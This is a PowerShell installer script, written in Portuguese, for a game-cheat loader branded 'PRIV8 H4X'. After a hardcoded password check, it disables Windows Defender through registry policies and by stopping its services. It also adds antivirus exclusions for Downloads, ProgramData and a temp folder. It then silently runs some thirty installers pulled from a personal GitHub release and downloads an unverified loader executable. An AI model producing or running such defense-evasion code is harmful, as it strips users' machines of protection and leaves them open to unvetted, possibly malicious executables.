<#
.SYNOPSIS
    Instalador automático para PRIV8 H4X
.DESCRIPTION
    - Solicita senha antes de qualquer ação.
    - Instala todas as dependências (VC++, .NET, DirectX)
    - Desabilita o Windows Defender
    - Baixa o Loader Priv8 para a pasta Downloads
    Execute como ADMINISTRADOR.
.NOTES
    Author: DEV @_esieme
    Repo: https://github.com/esieme/meu-loader-dependencias
#>

# ========== CONFIGURAÇÕES ==========
$BaseURL = "https://github.com/esieme/meu-loader-dependencias/releases/download/v1.0.0"
$PastaTemp = "$env:TEMP\PRV8_Drivers"
$LoaderURL = "https://raw.githubusercontent.com/jrh4x/priv8loader/refs/heads/main/Loader%20Priv8.exe"
$PastaDownloads = [Environment]::GetFolderPath("UserDownloads")
$CaminhoLoader = Join-Path $PastaDownloads "Loader Priv8.exe"
$SenhaScript = "devesieme1357"

# ========== FUNÇÃO DE INTERFACE COM TÍTULO ==========
function Show-Banner {
    Clear-Host
    Write-Host "╔═══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                                                                                       ║" -ForegroundColor Cyan
    Write-Host "║    ██████╗ ██████╗ ██╗██╗   ██╗    ██╗  ██╗ █████╗ ██╗  ██╗                           ║" -ForegroundColor Magenta
    Write-Host "║    ██╔══██╗██╔══██╗██║██║   ██║    ╚██╗██╔╝██╔══██╗╚██╗██╔╝                           ║" -ForegroundColor Magenta
    Write-Host "║    ██████╔╝██████╔╝██║██║   ██║     ╚███╔╝ ███████║ ╚███╔╝                            ║" -ForegroundColor Magenta
    Write-Host "║    ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝     ██╔██╗ ██╔══██║ ██╔██╗                            ║" -ForegroundColor Magenta
    Write-Host "║    ██║     ██║  ██║██║ ╚████╔╝     ██╔╝ ██╗██║  ██║██╔╝ ██╗                           ║" -ForegroundColor Magenta
    Write-Host "║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                           ║" -ForegroundColor Magenta
    Write-Host "║                                                                                       ║" -ForegroundColor Cyan
    Write-Host "║   SISTEMA DE INSTALAÇÃO AUTOMÁTICA - MELHOR PAINEL PRIV8 @Jr_h4x - @_esieme           ║" -ForegroundColor Cyan
    Write-Host "║                                                                                       ║" -ForegroundColor Cyan
    Write-Host "║  » Bem-vindo ao instalador oficial do loader PRIV8 H4X.                               ║" -ForegroundColor White
    Write-Host "║  » Este utilitário irá baixar e instalar TODAS as dependências necessárias.           ║" -ForegroundColor White
    Write-Host "║  » Processo completamente automático.                                                 ║" -ForegroundColor White
    Write-Host "║  » Execute como ADMINISTRADOR para evitar erros.                                      ║" -ForegroundColor Yellow
    Write-Host "║                                                                                       ║" -ForegroundColor Cyan
    Write-Host "║  © 2024 PRIV8 H4X - Segurança Blindada DMA. Todos os direitos reservados.             ║" -ForegroundColor Green
    Write-Host "║  DEV @_esieme                                                                         ║" -ForegroundColor Green
    Write-Host "║                                                                                       ║" -ForegroundColor Cyan
    Write-Host "╠═══════════════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
    Write-Host "║                                                                                       ║" -ForegroundColor Yellow
    Write-Host "║  ATENÇÃO: O sistema baixará e instalará vários componentes.                           ║" -ForegroundColor Yellow
    Write-Host "║  O processo pode levar até 15 minutos dependendo da sua internet.                     ║" -ForegroundColor Yellow
    Write-Host "║  Opçao de remover completamente o defender e instalaao do loader                      ║" -ForegroundColor Yellow
    Write-Host "╚═══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

# ========== VERIFICA ADMIN ==========
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Show-Banner
    Write-Host "❌ ERRO: Este script precisa ser executado como Administrador!" -ForegroundColor Red
    Write-Host "   Clique com botão direito no PowerShell e escolha 'Executar como administrador'." -ForegroundColor Yellow
    Read-Host "Pressione Enter para sair"
    exit 1
}

# ========== SOLICITA SENHA ==========
Show-Banner
Write-Host "🔐 ESTE INSTALADOR É PROTEGIDO POR SENHA" -ForegroundColor Red
Write-Host "   Digite a senha para continuar: " -ForegroundColor Yellow -NoNewline
$senhaDigitada = Read-Host
if ($senhaDigitada -ne $SenhaScript) {
    Write-Host "`n❌ SENHA INCORRETA! O instalador será encerrado." -ForegroundColor Red
    Read-Host "Pressione Enter para sair"
    exit 1
}
Write-Host "✅ Senha correta! Iniciando instalação..." -ForegroundColor Green
Start-Sleep -Seconds 2

# ========== PERGUNTA INICIAL (após senha) ==========
Show-Banner
Write-Host "👉 Deseja continuar com a instalação de todas as dependências e do loader? (S/N): " -ForegroundColor White -NoNewline
$resposta = Read-Host
if ($resposta -notin 'S','s','Sim','sim','SIM') {
    Write-Host "Instalação cancelada." -ForegroundColor Red
    exit 0
}

# ========== DESABILITAR WINDOWS DEFENDER ==========
Write-Host "`n🛡️ Desabilitando Windows Defender..." -ForegroundColor Yellow

# 1. Desabilitar proteção em tempo real via Registro
$regPaths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
)
foreach ($path in $regPaths) {
    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }
}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force

# 2. Desabilitar serviços do Defender
$services = @("WinDefend", "WdNisSvc", "WdBoot", "WdFilter", "WdHijack")
foreach ($svc in $services) {
    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
}

# 3. Adicionar exclusões de pastas (para evitar bloqueios)
Add-MpPreference -ExclusionPath "$env:ProgramData" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$PastaTemp" -ErrorAction SilentlyContinue

Write-Host "   ✅ Windows Defender desabilitado (reinicialização pode ser necessária para efeito total)" -ForegroundColor Green

# ========== PREPARA PASTA TEMPORÁRIA ==========
Write-Host "`n📁 Preparando ambiente..." -ForegroundColor Yellow
if (Test-Path $PastaTemp) { Remove-Item $PastaTemp -Recurse -Force }
New-Item -ItemType Directory -Path $PastaTemp -Force | Out-Null

# ========== LISTA DE ARQUIVOS (TODOS DA RELEASE) ==========
$Arquivos = @(
    # .NET Framework e Runtimes
    @{ Nome = "NDP481-x86-x64-AllOS-ENU.exe";               Desc = ".NET Framework 4.8.1";              Args = "/q /norestart"; Tipo = "exe" }
    @{ Nome = "dotnet-runtime-8.0.12-win-x64.exe";          Desc = ".NET Runtime 8.0.12";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "aspnetcore-runtime-8.0.12-win-x64.exe";      Desc = "ASP.NET Core Runtime 8.0.12";       Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "windowsdesktop-runtime-7.0.20-win-x64.exe";  Desc = ".NET Desktop Runtime 7.0.20";       Args = "/quiet /norestart"; Tipo = "exe" }
    
    # Visual C++
    @{ Nome = "vcredist2005_x64.exe";                       Desc = "Visual C++ 2005 x64";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2005_x86.exe";                       Desc = "Visual C++ 2005 x86";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2008_x64.exe";                       Desc = "Visual C++ 2008 x64";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2008_x86.exe";                       Desc = "Visual C++ 2008 x86";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2010_x64.exe";                       Desc = "Visual C++ 2010 x64";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2010_x86.exe";                       Desc = "Visual C++ 2010 x86";               Args = "/q"; Tipo = "exe" }
    @{ Nome = "vcredist2012_x64.exe";                       Desc = "Visual C++ 2012 x64";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2012_x86.exe";                       Desc = "Visual C++ 2012 x86";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2013_x64.exe";                       Desc = "Visual C++ 2013 x64";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2013_x86.exe";                       Desc = "Visual C++ 2013 x86";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2015_x64.exe";                       Desc = "Visual C++ 2015 x64";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2015_x86.exe";                       Desc = "Visual C++ 2015 x86";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2015_2017_2019_2022_x64.exe";        Desc = "VC++ 2015-2022 x64 (all-in-one)";    Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "vcredist2015_2017_2019_2022_x86.exe";        Desc = "VC++ 2015-2022 x86 (all-in-one)";    Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "VC_redist.x64.exe";                          Desc = "Visual C++ 2022 x64";               Args = "/quiet /norestart"; Tipo = "exe" }
    @{ Nome = "VC_redist.x86.exe";                          Desc = "Visual C++ 2022 x86";               Args = "/quiet /norestart"; Tipo = "exe" }
    
    # DirectX (arquivos auxiliares + instalador)
    @{ Nome = "dsetup.dll";                                 Desc = "DirectX - dsetup.dll";              Args = $null; Tipo = "aux" }
    @{ Nome = "dsetup32.dll";                               Desc = "DirectX - dsetup32.dll";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxupdate.cif";                               Desc = "DirectX - dxupdate.cif";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxupdate.dll";                               Desc = "DirectX - dxupdate.dll";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxupdate.inf";                               Desc = "DirectX - dxupdate.inf";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxwsetup.cif";                               Desc = "DirectX - dxwsetup.cif";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxwsetup.inf";                               Desc = "DirectX - dxwsetup.inf";            Args = $null; Tipo = "aux" }
    @{ Nome = "dxwsetup.exe";                               Desc = "DirectX Web Installer";             Args = "/silent"; Tipo = "exe" }
)

# ========== DOWNLOAD DE TODOS OS ARQUIVOS ==========
Write-Host "`n⬇️ Baixando todos os arquivos da release...`n" -ForegroundColor Cyan
$totalArquivos = $Arquivos.Count
$i = 0
foreach ($arq in $Arquivos) {
    $i++
    $url = "$BaseURL/$($arq.Nome)"
    $destino = Join-Path $PastaTemp $arq.Nome
    Write-Host "[$i/$totalArquivos] Baixando $($arq.Desc) ..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing
        Write-Host "      ✔ Download concluído" -ForegroundColor Green
    }
    catch {
        Write-Host "      ❌ Falha no download: $_" -ForegroundColor Red
    }
}

# ========== INSTALAÇÃO DOS COMPONENTES ==========
Write-Host "`n🔧 Iniciando instalação dos componentes...`n" -ForegroundColor Cyan
$ok = 0
$falhas = 0

# Instalar todos os .exe (exceto dxwsetup.exe por enquanto)
$executaveis = $Arquivos | Where-Object { $_.Tipo -eq "exe" -and $_.Nome -ne "dxwsetup.exe" }
$totalExe = $executaveis.Count
$j = 0

foreach ($exe in $executaveis) {
    $j++
    $caminho = Join-Path $PastaTemp $exe.Nome
    Write-Host "[$j/$totalExe] Instalando $($exe.Desc) ..." -ForegroundColor Yellow
    try {
        $processo = Start-Process -FilePath $caminho -ArgumentList $exe.Args -Wait -PassThru -NoNewWindow
        if ($processo.ExitCode -eq 0 -or $processo.ExitCode -eq 3010) {
            Write-Host "      ✔ Instalação concluída (código $($processo.ExitCode))" -ForegroundColor Green
            $ok++
        } else {
            Write-Host "      ⚠️ Código de saída $($processo.ExitCode) (pode já estar instalado)" -ForegroundColor Gray
            $ok++
        }
    }
    catch {
        Write-Host "      ❌ Falha na instalação: $_" -ForegroundColor Red
        $falhas++
    }
}

# Instalar DirectX
Write-Host "`n🎮 Instalando DirectX..." -ForegroundColor Cyan
$dxSetupPath = Join-Path $PastaTemp "dxwsetup.exe"
if (Test-Path $dxSetupPath) {
    try {
        Write-Host "   Executando dxwsetup.exe /silent ..." -ForegroundColor Yellow
        $processo = Start-Process -FilePath $dxSetupPath -ArgumentList "/silent" -Wait -PassThru -NoNewWindow
        if ($processo.ExitCode -eq 0 -or $processo.ExitCode -eq 3010) {
            Write-Host "   ✔ DirectX instalado com sucesso" -ForegroundColor Green
            $ok++
        } else {
            Write-Host "   ⚠️ DirectX código $($processo.ExitCode)" -ForegroundColor Gray
            $ok++
        }
    }
    catch {
        Write-Host "   ❌ Falha na instalação do DirectX: $_" -ForegroundColor Red
        $falhas++
    }
} else {
    Write-Host "   ❌ Arquivo dxwsetup.exe não encontrado" -ForegroundColor Red
    $falhas++
}

# ========== DOWNLOAD DO LOADER PRIV8 ==========
Write-Host "`n🚀 Baixando Loader Priv8..." -ForegroundColor Cyan
try {
    Write-Host "   Baixando de: $LoaderURL" -ForegroundColor Yellow
    Invoke-WebRequest -Uri $LoaderURL -OutFile $CaminhoLoader -UseBasicParsing
    Write-Host "   ✅ Loader salvo em: $CaminhoLoader" -ForegroundColor Green
}
catch {
    Write-Host "   ❌ Falha ao baixar o loader: $_" -ForegroundColor Red
}

# ========== FINALIZAÇÃO ==========
Write-Host "`n╔═════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                                                                                       ║" -ForegroundColor Green
Write-Host "║                           INSTALAÇÃO CONCLUÍDA!                                       ║" -ForegroundColor Green
Write-Host "║                                                                                       ║" -ForegroundColor Green
Write-Host "║  ✅ Componentes instalados com sucesso: $ok de $($totalExe+1) (incluindo DirectX)     ║" -ForegroundColor White
if ($falhas -gt 0) {
    Write-Host "║  ⚠️  Falhas: $falhas (verifique manualmente se necessário)                        ║" -ForegroundColor Yellow
}
Write-Host "║                                                                                       ║" -ForegroundColor White
Write-Host "║  📁 Loader Priv8 salvo em: $CaminhoLoader" -ForegroundColor White
Write-Host "║                                                                                       ║" -ForegroundColor White
Write-Host "║  🔁 Reinicie o computador para que todas as alterações tenham efeito.                 ║" -ForegroundColor Yellow
Write-Host "║                                                                                       ║" -ForegroundColor White
Write-Host "║  © 2024 PRIV8 H4X - Segurança Blindada DMA. Todos os direitos reservados.             ║" -ForegroundColor Green
Write-Host "║  DEV @_esieme                                                                         ║" -ForegroundColor Green
Write-Host "║                                                                                       ║" -ForegroundColor Green
Write-Host "╚═══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green

# Limpeza da pasta temporária (opcional)
Remove-Item $PastaTemp -Recurse -Force -ErrorAction SilentlyContinue

Read-Host "`nPressione Enter para sair"
